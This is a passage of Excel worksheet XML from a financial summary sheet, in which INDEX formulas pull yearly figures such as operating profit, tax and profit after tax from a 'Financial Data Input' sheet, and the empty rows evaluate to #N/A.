        <f ca="1">IF(B15="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A15,D$6),NA()))</f>
        <v>134137.45000000001</v>
      </c>
      <c r="E15">
        <f ca="1">IF(B15="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A15,E$6),NA()))</f>
        <v>142728.38</v>
      </c>
      <c r="F15">
        <f ca="1">IF(B15="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A15,F$6),NA()))</f>
        <v>150687.46</v>
      </c>
      <c r="G15">
        <f ca="1">IF(B15="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A15,G$6),NA()))</f>
        <v>165044.56</v>
      </c>
    </row>
    <row r="16" spans="1:9" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A16">
        <f>ROWS($B$15:B16)</f>
        <v>2</v>
      </c>
      <c r="B16" t="str">
        <f>IF('Financial Data Input'!B7=0,"",'Financial Data Input'!B7)</f>
        <v>OPERATING EXPENSES</v>
      </c>
      <c r="C16">
        <f ca="1">IF(B16="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A16,C$6),NA()))</f>
        <v>65000</v>
      </c>
      <c r="D16">
        <f ca="1">IF(B16="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A16,D$6),NA()))</f>
        <v>70962.31</v>
      </c>
      <c r="E16">
        <f ca="1">IF(B16="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A16,E$6),NA()))</f>
        <v>75924.86</v>
      </c>
      <c r="F16">
        <f ca="1">IF(B16="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A16,F$6),NA()))</f>
        <v>78901.27</v>
      </c>
      <c r="G16">
        <f ca="1">IF(B16="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A16,G$6),NA()))</f>
        <v>81674.37</v>
      </c>
    </row>
    <row r="17" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A17">
        <f>ROWS($B$15:B17)</f>
        <v>3</v>
      </c>
      <c r="B17" t="str">
        <f>IF('Financial Data Input'!B8=0,"",'Financial Data Input'!B8)</f>
        <v>OPERATING PROFIT</v>
      </c>
      <c r="C17">
        <f ca="1">IF(B17="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A17,C$6),NA()))</f>
        <v>60000</v>
      </c>
      <c r="D17">
        <f ca="1">IF(B17="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A17,D$6),NA()))</f>
        <v>64207.3</v>
      </c>
      <c r="E17">
        <f ca="1">IF(B17="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A17,E$6),NA()))</f>
        <v>68857.69</v>
      </c>
      <c r="F17">
        <f ca="1">IF(B17="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A17,F$6),NA()))</f>
        <v>75643.25</v>
      </c>
      <c r="G17">
        <f ca="1">IF(B17="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A17,G$6),NA()))</f>
        <v>76755.259999999995</v>
      </c>
    </row>
    <row r="18" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A18">
        <f>ROWS($B$15:B18)</f>
        <v>4</v>
      </c>
      <c r="B18" t="str">
        <f>IF('Financial Data Input'!B9=0,"",'Financial Data Input'!B9)</f>
        <v>DEPRECIATION</v>
      </c>
      <c r="C18">
        <f ca="1">IF(B18="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A18,C$6),NA()))</f>
        <v>4500</v>
      </c>
      <c r="D18">
        <f ca="1">IF(B18="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A18,D$6),NA()))</f>
        <v>4517.7700000000004</v>
      </c>
      <c r="E18">
        <f ca="1">IF(B18="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A18,E$6),NA()))</f>
        <v>4656.92</v>
      </c>
      <c r="F18">
        <f ca="1">IF(B18="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A18,F$6),NA()))</f>
        <v>4974.21</v>
      </c>
      <c r="G18">
        <f ca="1">IF(B18="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A18,G$6),NA()))</f>
        <v>5024.1099999999997</v>
      </c>
    </row>
    <row r="19" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A19">
        <f>ROWS($B$15:B19)</f>
        <v>5</v>
      </c>
      <c r="B19" t="str">
        <f>IF('Financial Data Input'!B10=0,"",'Financial Data Input'!B10)</f>
        <v>INTEREST</v>
      </c>
      <c r="C19">
        <f ca="1">IF(B19="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A19,C$6),NA()))</f>
        <v>2500</v>
      </c>
      <c r="D19">
        <f ca="1">IF(B19="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A19,D$6),NA()))</f>
        <v>2745.82</v>
      </c>
      <c r="E19">
        <f ca="1">IF(B19="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A19,E$6),NA()))</f>
        <v>2893.11</v>
      </c>
      <c r="F19">
        <f ca="1">IF(B19="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A19,F$6),NA()))</f>
        <v>3136.12</v>
      </c>
      <c r="G19">
        <f ca="1">IF(B19="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A19,G$6),NA()))</f>
        <v>3148.53</v>
      </c>
    </row>
    <row r="20" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A20">
        <f>ROWS($B$15:B20)</f>
        <v>6</v>
      </c>
      <c r="B20" t="str">
        <f>IF('Financial Data Input'!B11=0,"",'Financial Data Input'!B11)</f>
        <v>NET PROFIT</v>
      </c>
      <c r="C20">
        <f ca="1">IF(B20="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A20,C$6),NA()))</f>
        <v>54000</v>
      </c>
      <c r="D20">
        <f ca="1">IF(B20="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A20,D$6),NA()))</f>
        <v>54761.074999999997</v>
      </c>
      <c r="E20">
        <f ca="1">IF(B20="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A20,E$6),NA()))</f>
        <v>55860.81</v>
      </c>
      <c r="F20">
        <f ca="1">IF(B20="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A20,F$6),NA()))</f>
        <v>59747.95</v>
      </c>
      <c r="G20">
        <f ca="1">IF(B20="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A20,G$6),NA()))</f>
        <v>61483.59</v>
      </c>
    </row>
    <row r="21" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A21">
        <f>ROWS($B$15:B21)</f>
        <v>7</v>
      </c>
      <c r="B21" t="str">
        <f>IF('Financial Data Input'!B12=0,"",'Financial Data Input'!B12)</f>
        <v>TAX</v>
      </c>
      <c r="C21">
        <f ca="1">IF(B21="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A21,C$6),NA()))</f>
        <v>22000</v>
      </c>
      <c r="D21">
        <f ca="1">IF(B21="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A21,D$6),NA()))</f>
        <v>23920.54</v>
      </c>
      <c r="E21">
        <f ca="1">IF(B21="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A21,E$6),NA()))</f>
        <v>25576.74</v>
      </c>
      <c r="F21">
        <f ca="1">IF(B21="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A21,F$6),NA()))</f>
        <v>27498.86</v>
      </c>
      <c r="G21">
        <f ca="1">IF(B21="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A21,G$6),NA()))</f>
        <v>28335.67</v>
      </c>
    </row>
    <row r="22" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A22">
        <f>ROWS($B$15:B22)</f>
        <v>8</v>
      </c>
      <c r="B22" t="str">
        <f>IF('Financial Data Input'!B13=0,"",'Financial Data Input'!B13)</f>
        <v>PROFIT AFTER TAX</v>
      </c>
      <c r="C22">
        <f ca="1">IF(B22="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A22,C$6),NA()))</f>
        <v>32000</v>
      </c>
      <c r="D22">
        <f ca="1">IF(B22="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A22,D$6),NA()))</f>
        <v>34943.49</v>
      </c>
      <c r="E22">
        <f ca="1">IF(B22="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A22,E$6),NA()))</f>
        <v>38418.53</v>
      </c>
      <c r="F22">
        <f ca="1">IF(B22="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A22,F$6),NA()))</f>
        <v>39895.050000000003</v>
      </c>
      <c r="G22">
        <f ca="1">IF(B22="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A22,G$6),NA()))</f>
        <v>40607.730000000003</v>
      </c>
    </row>
    <row r="23" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A23">
        <f>ROWS($B$15:B23)</f>
        <v>9</v>
      </c>
      <c r="B23" t="str">
        <f>IF('Financial Data Input'!B14=0,"",'Financial Data Input'!B14)</f>
        <v>METRIC 1</v>
      </c>
      <c r="C23">
        <f ca="1">IF(B23="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A23,C$6),NA()))</f>
        <v>12.8</v>
      </c>
      <c r="D23">
        <f ca="1">IF(B23="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A23,D$6),NA()))</f>
        <v>12.81</v>
      </c>
      <c r="E23">
        <f ca="1">IF(B23="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A23,E$6),NA()))</f>
        <v>13.78</v>
      </c>
      <c r="F23">
        <f ca="1">IF(B23="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A23,F$6),NA()))</f>
        <v>14.29</v>
      </c>
      <c r="G23">
        <f ca="1">IF(B23="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A23,G$6),NA()))</f>
        <v>15.57</v>
      </c>
    </row>
    <row r="24" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A24">
        <f>ROWS($B$15:B24)</f>
        <v>10</v>
      </c>
      <c r="B24" t="str">
        <f>IF('Financial Data Input'!B15=0,"",'Financial Data Input'!B15)</f>
        <v>METRIC 2</v>
      </c>
      <c r="C24">
        <f ca="1">IF(B24="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A24,C$6),NA()))</f>
        <v>18.2</v>
      </c>
      <c r="D24">
        <f ca="1">IF(B24="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A24,D$6),NA()))</f>
        <v>18.59</v>
      </c>
      <c r="E24">
        <f ca="1">IF(B24="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A24,E$6),NA()))</f>
        <v>19.22</v>
      </c>
      <c r="F24">
        <f ca="1">IF(B24="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A24,F$6),NA()))</f>
        <v>20.170000000000002</v>
      </c>
      <c r="G24">
        <f ca="1">IF(B24="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A24,G$6),NA()))</f>
        <v>20.48</v>
      </c>
    </row>
    <row r="25" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A25">
        <f>ROWS($B$15:B25)</f>
        <v>11</v>
      </c>
      <c r="B25" t="str">
        <f>IF('Financial Data Input'!B16=0,"",'Financial Data Input'!B16)</f>
        <v>METRIC 3</v>
      </c>
      <c r="C25">
        <f ca="1">IF(B25="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A25,C$6),NA()))</f>
        <v>19.100000000000001</v>
      </c>
      <c r="D25">
        <f ca="1">IF(B25="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A25,D$6),NA()))</f>
        <v>20.55</v>
      </c>
      <c r="E25">
        <f ca="1">IF(B25="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A25,E$6),NA()))</f>
        <v>21.87</v>
      </c>
      <c r="F25">
        <f ca="1">IF(B25="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A25,F$6),NA()))</f>
        <v>23.19</v>
      </c>
      <c r="G25">
        <f ca="1">IF(B25="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A25,G$6),NA()))</f>
        <v>24.67</v>
      </c>
    </row>
    <row r="26" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A26">
        <f>ROWS($B$15:B26)</f>
        <v>12</v>
      </c>
      <c r="B26" t="str">
        <f>IF('Financial Data Input'!B17=0,"",'Financial Data Input'!B17)</f>
        <v>METRIC 4</v>
      </c>
      <c r="C26">
        <f ca="1">IF(B26="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A26,C$6),NA()))</f>
        <v>12.1</v>
      </c>
      <c r="D26">
        <f ca="1">IF(B26="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A26,D$6),NA()))</f>
        <v>12.21</v>
      </c>
      <c r="E26">
        <f ca="1">IF(B26="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A26,E$6),NA()))</f>
        <v>12.59</v>
      </c>
      <c r="F26">
        <f ca="1">IF(B26="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A26,F$6),NA()))</f>
        <v>13.7</v>
      </c>
      <c r="G26">
        <f ca="1">IF(B26="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A26,G$6),NA()))</f>
        <v>13.76</v>
      </c>
    </row>
    <row r="27" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A27">
        <f>ROWS($B$15:B27)</f>
        <v>13</v>
      </c>
      <c r="B27" t="str">
        <f>IF('Financial Data Input'!B18=0,"",'Financial Data Input'!B18)</f>
        <v>METRIC 5</v>
      </c>
      <c r="C27">
        <f ca="1">IF(B27="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A27,C$6),NA()))</f>
        <v>0.75</v>
      </c>
      <c r="D27">
        <f ca="1">IF(B27="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A27,D$6),NA()))</f>
        <v>0.79</v>
      </c>
      <c r="E27">
        <f ca="1">IF(B27="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A27,E$6),NA()))</f>
        <v>0.85</v>
      </c>
      <c r="F27">
        <f ca="1">IF(B27="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A27,F$6),NA()))</f>
        <v>0.89</v>
      </c>
      <c r="G27">
        <f ca="1">IF(B27="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A27,G$6),NA()))</f>
        <v>0.91</v>
      </c>
    </row>
    <row r="28" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A28">
        <f>ROWS($B$15:B28)</f>
        <v>14</v>
      </c>
      <c r="B28" t="str">
        <f>IF('Financial Data Input'!B19=0,"",'Financial Data Input'!B19)</f>
        <v>METRIC 6</v>
      </c>
      <c r="C28">
        <f ca="1">IF(B28="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A28,C$6),NA()))</f>
        <v>0.23</v>
      </c>
      <c r="D28">
        <f ca="1">IF(B28="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A28,D$6),NA()))</f>
        <v>0.25</v>
      </c>
      <c r="E28">
        <f ca="1">IF(B28="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A28,E$6),NA()))</f>
        <v>0.27</v>
      </c>
      <c r="F28">
        <f ca="1">IF(B28="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A28,F$6),NA()))</f>
        <v>0.28000000000000003</v>
      </c>
      <c r="G28">
        <f ca="1">IF(B28="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A28,G$6),NA()))</f>
        <v>0.28999999999999998</v>
      </c>
    </row>
    <row r="29" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A29">
        <f>ROWS($B$15:B29)</f>
        <v>15</v>
      </c>
      <c r="B29" t="str">
        <f>IF('Financial Data Input'!B20=0,"",'Financial Data Input'!B20)</f>
        <v/>
      </c>
      <c r="C29" t="e">
        <f>IF(B29="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A29,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D29" t="e">
        <f>IF(B29="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A29,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E29" t="e">
        <f>IF(B29="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A29,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F29" t="e">
        <f>IF(B29="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A29,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G29" t="e">
        <f>IF(B29="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A29,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="30" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A30">
        <f>ROWS($B$15:B30)</f>
        <v>16</v>
      </c>
      <c r="B30" t="str">
        <f>IF('Financial Data Input'!B21=0,"",'Financial Data Input'!B21)</f>
        <v/>
      </c>
      <c r="C30" t="e">
        <f>IF(B30="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A30,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D30" t="e">
        <f>IF(B30="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A30,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E30" t="e">
        <f>IF(B30="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A30,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F30" t="e">
        <f>IF(B30="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A30,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G30" t="e">
        <f>IF(B30="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A30,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="31" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A31">
        <f>ROWS($B$15:B31)</f>
        <v>17</v>
      </c>
      <c r="B31" t="str">
        <f>IF('Financial Data Input'!B22=0,"",'Financial Data Input'!B22)</f>
        <v/>
      </c>
      <c r="C31" t="e">
        <f>IF(B31="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A31,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D31" t="e">
        <f>IF(B31="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A31,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E31" t="e">
        <f>IF(B31="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A31,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F31" t="e">
        <f>IF(B31="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A31,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G31" t="e">
        <f>IF(B31="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A31,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="32" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A32">
        <f>ROWS($B$15:B32)</f>
        <v>18</v>
      </c>
      <c r="B32" t="str">
        <f>IF('Financial Data Input'!B23=0,"",'Financial Data Input'!B23)</f>
        <v/>
      </c>
      <c r="C32" t="e">
        <f>IF(B32="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A32,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D32" t="e">
        <f>IF(B32="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A32,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E32" t="e">
        <f>IF(B32="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A32,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F32" t="e">
        <f>IF(B32="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A32,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G32" t="e">
        <f>IF(B32="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A32,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="33" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A33">
        <f>ROWS($B$15:B33)</f>
        <v>19</v>
      </c>
      <c r="B33" t="str">
        <f>IF('Financial Data Input'!B24=0,"",'Financial Data Input'!B24)</f>
        <v/>
      </c>
      <c r="C33" t="e">
        <f>IF(B33="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A33,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D33" t="e">
        <f>IF(B33="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A33,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E33" t="e">
        <f>IF(B33="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A33,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F33" t="e">
        <f>IF(B33="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A33,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G33" t="e">
        <f>IF(B33="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A33,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="34" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A34">
        <f>ROWS($B$15:B34)</f>
        <v>20</v>
      </c>
      <c r="B34" t="str">
        <f>IF('Financial Data Input'!B25=0,"",'Financial Data Input'!B25)</f>
        <v/>
      </c>
      <c r="C34" t="e">
        <f>IF(B34="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A34,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D34" t="e">
        <f>IF(B34="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A34,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E34" t="e">
        <f>IF(B34="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A34,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F34" t="e">
        <f>IF(B34="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A34,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G34" t="e">
        <f>IF(B34="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A34,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="35" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A35">
        <f>ROWS($B$15:B35)</f>
        <v>21</v>
      </c>
      <c r="B35" t="str">
        <f>IF('Financial Data Input'!B26=0,"",'Financial Data Input'!B26)</f>
        <v/>
      </c>
      <c r="C35" t="e">
        <f>IF(B35="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A35,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D35" t="e">
        <f>IF(B35="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A35,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E35" t="e">
        <f>IF(B35="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A35,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F35" t="e">
        <f>IF(B35="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A35,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G35" t="e">
        <f>IF(B35="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A35,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="36" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A36">
        <f>ROWS($B$15:B36)</f>
        <v>22</v>
      </c>
      <c r="B36" t="str">
        <f>IF('Financial Data Input'!B27=0,"",'Financial Data Input'!B27)</f>
        <v/>
      </c>
      <c r="C36" t="e">
        <f>IF(B36="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A36,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D36" t="e">
        <f>IF(B36="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A36,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E36" t="e">
        <f>IF(B36="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A36,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F36" t="e">
        <f>IF(B36="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A36,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G36" t="e">
        <f>IF(B36="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A36,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="37" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A37">
        <f>ROWS($B$15:B37)</f>
        <v>23</v>
      </c>
      <c r="B37" t="str">
        <f>IF('Financial Data Input'!B28=0,"",'Financial Data Input'!B28)</f>
        <v/>
      </c>
      <c r="C37" t="e">
        <f>IF(B37="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A37,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D37" t="e">
        <f>IF(B37="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A37,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E37" t="e">
        <f>IF(B37="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A37,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F37" t="e">
        <f>IF(B37="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A37,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G37" t="e">
        <f>IF(B37="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A37,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="38" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A38">
        <f>ROWS($B$15:B38)</f>
        <v>24</v>
      </c>
      <c r="B38" t="str">
        <f>IF('Financial Data Input'!B29=0,"",'Financial Data Input'!B29)</f>
        <v/>
      </c>
      <c r="C38" t="e">
        <f>IF(B38="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A38,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D38" t="e">
        <f>IF(B38="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A38,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E38" t="e">
        <f>IF(B38="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A38,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F38" t="e">
        <f>IF(B38="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A38,F$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="G38" t="e">
        <f>IF(B38="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A38,G$6),NA()))</f>
        <v>#N/A</v>
      </c>
    </row>
    <row r="39" spans="1:7" ht="19.5" customHeight="1" x14ac:dyDescent="0.45">
      <c r="A39">
        <f>ROWS($B$15:B39)</f>
        <v>25</v>
      </c>
      <c r="B39" t="str">
        <f>IF('Financial Data Input'!B30=0,"",'Financial Data Input'!B30)</f>
        <v/>
      </c>
      <c r="C39" t="e">
        <f>IF(B39="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A39,C$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="D39" t="e">
        <f>IF(B39="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A39,D$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="E39" t="e">
        <f>IF(B39="",NA(),IFERROR(INDEX('Financial Data Input'!$B$6:$I$30,$A39,E$6),NA()))</f>
        <v>#N/A</v>
      </c>
      <c r="F39" t="e">
